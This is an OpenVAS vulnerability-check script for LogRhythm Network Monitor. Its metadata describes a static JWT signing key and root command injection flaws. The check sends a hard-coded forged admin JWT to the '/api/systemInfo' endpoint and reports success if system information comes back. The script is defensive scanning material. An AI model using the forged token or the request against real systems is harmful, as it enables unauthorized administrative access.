###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_logrhythm_netmon_auth_bypass_vuln.nasl 6052 2017-04-28 15:01:41Z ckuerste $
#
# Logrhythm Network Monitor Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:logrhythm:network_monitor";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106798");
  script_version("$Revision: 6052 $");
  script_tag(name: "last_modification", value: "$Date: 2017-04-28 17:01:41 +0200 (Fri, 28 Apr 2017) $");
  script_tag(name: "creation_date", value: "2017-04-28 15:23:53 +0200 (Fri, 28 Apr 2017)");
  script_tag(name: "cvss_base", value: "10.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name: "qod_type", value: "remote_vul");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name(" Logrhythm Network Monitor Multiple Vulnerabilities");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_logrhythm_netmon_detect.nasl");
  script_mandatory_keys("logrhythm_netmon/installed");

  script_tag(name: "summary", value: "Logrhythm Network Monitor is prone to multiple vulnerabilities.");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP request and checks the response.");

  script_tag(name: "insight", value: "Logrhythm Network Monitor is prone to multiple vulnerabilities:

- The application web interface uses JSON Web Tokens (JWT) to authenticate users and manage user sessions.
However, the secret key used to sign the JWT tokens is static across multiple deployments of the software. This
vulnerability can be exploited to forge arbitrary JWT tokens and bypass authentication to the LogRhythm Network
Monitor web management interface.

- Multiple command injection vulnerabilities exist in the application web management interface due to unescaped
user-input used to dynamically construct system shell commands. These vulnerabilities can be exploited to run 
arbitrary commands in the context of the root user and fully compromise the LogRhythm Network Monitor host.");

  script_tag(name: "solution", value: "No solution or patch is available as of 28th April, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "http://www.security-assessment.com/files/documents/advisory/Logrhythm-NetMonitor-Advisory.pdf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

# this token is generate with the example code in the advisory. Since NASL doesn't have HMAC SHA256 currently
# implemented the expire time is set to 2022 which should be enough for the average check.
token = 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0OTMzODU0MjAsImRhdGEiOnsidXNlcm5hbWUiOiJhZG1pbiIsInRpbWVUb1Jlc2V0UGFzcyI6ZmFsc2UsInJvbGUiOiJhZG1pbiIsImxpY2Vuc2VkIjp0cnVlfSwiZXhwIjoxNjUxMDY1NDIwfQ.oynktDKyLAE-NVy8nd9coUEF_E7XFCTXcukhZ1Rdo3bcSPnVCwvFQ-7UPFvjFGm5x8szX6A1hwJ-3EtE12ekuw';

req = http_get_req(port: port, url: "/api/systemInfo", add_headers: make_array("token", token));
res = http_keepalive_send_recv(port: port, data: req);

if ("licensedName" >< res && "versions" >< res) {
  report = "It was possible to access the system information with a forged token:\n\nRequest:\n";
  report += req + "\n";
  report += "Response:\n" + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);